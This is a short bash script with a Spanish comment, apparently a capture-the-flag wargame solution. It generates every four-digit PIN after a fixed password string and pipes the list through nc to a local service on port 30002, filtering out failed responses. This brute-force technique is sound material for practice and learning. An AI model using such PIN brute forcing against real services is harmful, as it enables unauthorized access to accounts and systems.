#!/bin/bash

for i in {0000..9999}; do
         echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" 
 done


Para mandar este diccionario de contraseñas por un puerto especifico seria con este comando: 
  
  cat dictionary.txt | nc localhost 30002 | grep -v -E "Wrong|Please" (grep -v -E para quitar errores en caso de ser necesario)
